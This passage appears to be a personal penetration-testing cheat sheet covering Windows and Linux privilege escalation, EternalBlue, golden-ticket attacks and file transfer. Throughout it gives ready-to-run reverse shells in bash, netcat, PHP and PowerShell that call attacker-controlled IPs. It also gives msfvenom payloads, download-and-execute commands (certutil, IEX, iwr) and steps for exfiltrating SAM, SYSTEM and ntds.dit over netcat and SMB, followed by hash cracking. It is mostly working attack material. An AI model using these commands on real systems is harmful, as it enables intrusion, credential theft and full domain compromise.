https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md


'\juicypotato.exe -t * -p shell.bat -l 4545 -c "CLSID" 4545'
```

### Sweet Potato
https://github.com/uknowsec/SweetPotato/blob/master/README.md
```
powershell iwr http://10.8.0.24/SweetPotato.exe -outfile .\potato.exe
.\potato.exe -a "C:\inetpub\wwwroot\nc.exe -e cmd.exe 10.8.0.x 443"

Connect using a listener on kali

```
### Export SAM and SYSTEM file to kali machine
```
impacket-smbserver share -smb2support -username USER -password PASS

# On windows use net use X: \\10.8.0.3\share /user:USER PASS
copy Backup\* X:\

// Files should be on kali
// dump stored hash from registry files

impacket-secretdump -sam SAM -system SYSTEM LOCAL

// Put admin nthash in a file

// Use hashcat to crack the hash
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt

// Use xfreedp or evil-winrm to gain access

evil-winrm -i 192.168.x.x -u Adminstrator -p PASS

OR
Using Metasploit for above
After uploading into shares use msfconsole

use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST IP
set LPORT 4446
run
```

### Eternal Blue
```
#https://github.com/helviojunior/MS17-010
#Generate payload in exe format and use the send_and_execute.py
msfvenom -p windows/shel_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
# If this does not work, use the paylaod created by the following commands
msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=10.10.14.28 LPORT=443 -f raw -o sc_x64_payload.bin
nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
```




## Payloads

#Payload Links
```https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config```

### Low Privilege Reverse Shell
```
#!/bin/bash
nc -e /bin/sh 192.168.x.x 4444
```
### Reverse Bash RAW for message redirecting
``` msfvenom -p cmd/unix/reverse_bash lhost=192.168.2.0 lport=4444 R ```

OUTPUT =  ```echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60"```

Redirect this to message service on vulnerable machine e.g: 

```echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60" >> send_message_to_machine.sh```

### ExecStart exploit
``` ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'
# To file: echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'" >> /tmp/wrapper.sh
```
### PHP Reverse Shell
https://github.com/pentestmonkey/php-reverse-shell

### Tiny PHP reverse shell
``` <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");```

### Reverse powershell 
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
```
### Windows reverse PHP 
```
https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php
```

### ASPX payload for web 
```
aspx payload for web or  FTP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip> LPORT=4000 -f aspx > rev.aspx
```

## Password Cracking
https://www.tunnelsup.com/hash-analyzer/

### hashcat
```
#If md5 hash is found
hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt 
```
### John the ripper
```
john hash --wordlist=/user/share/wordlists/rockyou.txt --format=md5crypt

format
username:hash
```
``` john hash --show```
Include full passwd file entry in hash

## Helpful tools

### Decode hash base64
``` echo ' HASH '  | base64 -d ```

### Hashing types
```
#Mscache V2
hashcat -m 2100
#Kerberoast
hashcat -m 13100
#ASREP roast
hashcat -m 18200
#NTLM
hashcat -m 1000
#responder hash
hashcat -m 5600
#MYSQL file hashes
mysql-sha1
```

### Evil winrm tips
```
Once in if on windows do whoami /all to see users groups
```
### File permissions to run
```
chmod 777 OR chmod 600
chmod +x file_name  - give current user permisson
```

### Find directories that are writable linux
```
find / -type d -writable -print
```

### Connect to SQL server with login
```
sqsh -S 192.168.2.x -U 192.168.2.x\\user_name -P this1smyPassword

```

## Exploits- Specific Scenarios

### CMS Made Simple 2.2.5 Authenticated Remote Code Execution
```
# Enumerate the directories
dirb http://192.168.56.126/   -> make sure to include the directed page e.g /cmsms/ as URL
Visit and follow
https://www.exploit-db.com/exploits/44976
- NOTE! When uploading file to CMS copy to .php file type in the upload folder
```

### from xp_cmdshell to shell
```
DOWNLOAD nc.exe from and upload to directory to use
https://packetstormsecurity.com/files/download/31140/nc.exe

xp_cmdshell 'PAYLOAD';
\go

PAYLOAD = 'C:\inetpub\wwwroot\nc.exe -e cmd.exe 10.8.0.x 443'
```


### IIS FTP file upload exploit
```
https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/
```

### Install chisel and use to port forward
```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_386.gz
gzip -d chisel_1.9.1_linux_386.gz

Install on vuln machine:
Use scp with an SSH server -
scp -i groundfloor_user_sshkey chisel_1.9.1_linux_386 groundfloor@192.168.2.105:/home/groundfloor/

start server on kali machine:
chmod 777 first
./chisel_1.9.1_linux_386 server --reverse --port 3333

start server on target machine
/chisel_1.9.1_linux_386 client 10.8.0.11:3333 R:80:127.0.0.1:80

Connect by entering localhost into browser on kali
```

### Wordpress non public exploit
```
if able to login to the admin panel
go to appearance and select 404.php, replace content with reverse shell payload, setup listener, go to nonexisting page
plugin shell upload
https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
```

### Dirty cow
```
Go to exploit website: https://dirtycow.ninja/
Select the exploit required, e.g. dirty.c (https://github.com/FireFart/dirtycow/blob/master/dirty.c)
vim dirtycow.txt
paste in code
mv dirtycow.txt dirtycow.c
gcc -pthread dirtycow.c  -o dirty -lcrypt
./dirty

script may take a few minutes to complete
su firefart

```
### Linux exploit suggester
```
cp /usr/share/linux-exploit-suggester/linux-exploit-suggester.sh
python -m SimpleHTTPServer 80
In machine
wget http://10.8.0.131/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

On Kali download an epxloit suggestion and have it in same directory as hosting webserver
wget http://10.8.0.131/39166.c
Run exploit using instructions
```

### Golden ticket method
```
Once access has been gained from windows machine
whoami /user
CopySID - S-1-5-(not this part, it is the RID)
- Find the domain name:
systeminfo | findstr /B "Domain"   (e.g. Morrowind-West.province.com)

Find the KRBTGT which is the key distribution account (using mimikatz) so we must get
mimikatz onto the target machine

On KALI:
cp -r /usr/share/windows-resources/mimikatz
Note: If this does not work, download the latest mimikatz from here
https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe
python -m SimpleHTTPServer 80

On Windows:
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.0.131/mimikatz.exe','c:\Temp\mimikatz2.exe')"

Run mimikatz:
mimikatz.exe

lsadump::dcsync /domain:Morrowind-West.province.com /user:krbtgt

Copy password hash: which is Hash NTLM
Golden ticket recipe is;
DOMAIN - Morrowind-West.province.com
DOMAIN SID - S-1-5
KRBTGT - 0f193cde5e5e9765366534e4da178564 (pass hash)

To create:
kerberos::golden /domain:Morrowind-West.province.com /sid:S-1-5/rc4:0f193cde5e5e9765366534e4da178564 /id:500 /user:kali

Pass ticket:
kerberos::ptt ticket.kirbi

Now damage:
pushd \\Morrowind-West.province.com\c$
cd Windows
cd NTDS

We can now access the ntds.dit file and extract the passwords as we are inside the domain directory, Once we have this file we have access to every account in the domain.

Perform shadow copy:
vssadmin create shadow /for=C:

Copy from the shadow directory into tmp
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit
c:\temp\ntds.dit

Also copy the system config file
copy\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\SYSTEM
dir

We now have a copy of ntds.dit and the required System file to decrypt it.
We should now start extracting it on kali linux so we must move these files over, one way we
can do this is by putting netcat on the windows machine.

- popd   (This is so that it will allow us to use netcat correctly)
- cd \Temp
Windows- powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.8.0.131/nc64.exe', 'c:\Temp\nc64.exe')"
Kali- nc -lvnp 4444 > SYSTEM
Windows- nc64.exe 10.8.0.131 4444 < SYSTEM
Windows- nc.exe 10.8.0.131 4444 < ntds.dit

Now that the files are safely on our kali machine we can begin cracking. We will use a python file called “secretsdump.py
cp /usr/share/doc/python3-impacket/examples/secretsdump.py

sudo git clone https://github.com/SecureAuthCorp/impacket.git
python3 secretsdump.py -ntds ./ntds.dit -system SYSTEM LOCAL -outputfile ./myhashes.txt

hashcat -m 1000 myhashes.txt.ntds /home/kali/rockyou.txt -r /usr/share/hashcat/rules/dive.rule

```
### File transfer
```
Section 2 – File Transfer (Windows and Kali Linux)

Note! Make sure file location is in safe directory or in /var/www 
Note! May need to run Set-ExecutionPolicy Unrestricted OR  powershell.exe -ExecutionPolicy Bypass

#HTTP

Kali Linux Machine
Python -m SimpleHTTPServer 80

Windows Powershell:
$WebClient = New-Object System.Net.WebClient 
$url = “http://Your_Kali_IP_Address/putty.exe” 
$pathFile= “C:\Users\cyberlab\putty.exe” (file to your path)
$WebClient.DownloadFile ($url, $pathFile)

#HTTP 2
Python -m SimpleHTTPServer 80

ON Windows Browser type http://your_kali_linux_ip/file.exe

#Using Invoke-Expression cmdlet (IEX)- no Admin Privilege

Kali Linux Machine
Create a script
myScript.ps1 
^^^^^^^^^^^^
Ls
Get-host

Windows Powershell:

$WebClient = New-Object System.Net.WebClient 
$url = “http:// Your_Kali_IP_Address /myScript.ps1” 
powershell.exe IEX ($WebClient.DownloadString ($url))

#Certutil


Kali Linux

python -m SimpleHTTPServer 80


Windows Machine

certutil -urlcache -split -f http://192.168.57.6/putty.exe putty.exe 
dir


#Curl


Kali Linux

python -m SimpleHTTPServer 80


Windows Machine

curl http://192.168.57.6/putty.exe -o putty.exe 
dir.


#wget


Kali Linux

python -m SimpleHTTPServer 80

Windows Machine

wget http://192.168.57.6/putty.exe -OutFile putty.exe 
OR
powershell.exe wget http://192.168.57.6/putty.exe -OutFile putty.exe
 

#FTP

Kali Linux Machine

Install 
pip install pyftpdlib

Start FTP Server
 python3 -m pyftpdlib -p 21 -u <user_name -P <pass_word>

Windows Powershell:

ftp 192.168.57.6 
get file.txt 
dir


Automate Transferring File using FTP commands

echo open 192.168.53.102 > Auto_Xfile.txt
echo USER >> Auto_Xfile.txt
echo Kali >> Auto_Xfile.txt
echo Kali >> Auto_Xfile.txt
echo binary >> Auto_Xfile.txt
echo GET file.exe >> Auto_Xfile.txt
echo bye >> Auto_Xfile.txt



#SMB
NOTE! Make sure the port number for SMB is closed down -> 445 or 139
NOTE! Make sure if you use pwd file is in current directory

Kali Linux Machine

impacket-smbserver share $(pwd) -smb2support # Start SMB server in the current directory 
 OR 
impacket-smbserver share /root/Downloads/test -smb2support 
 OR 
python3 smbserver.py share /root/test -smb2support

Windows Powershell: Choose one of 3 options

copy \\192.168.57.6\share\putty.exe 
net use \\192.168. 57.6\share
net use 
copy \\192.168. 57.6\share\putty.exe 
dir.


#TFTP
Note! May need to enable TFTP on windows machine!

Kali Linux

Open MetaSploit and use TFTP modules

In MetaSploit
Msf > Use auxiliary/server/tftp
Msf auxiliary(tftp) > set TFTPROOT /root/shells TFTPROOT => /root/shells

Windows Machine

Tftp -I <ip_address> GET <file_name>
dir
```







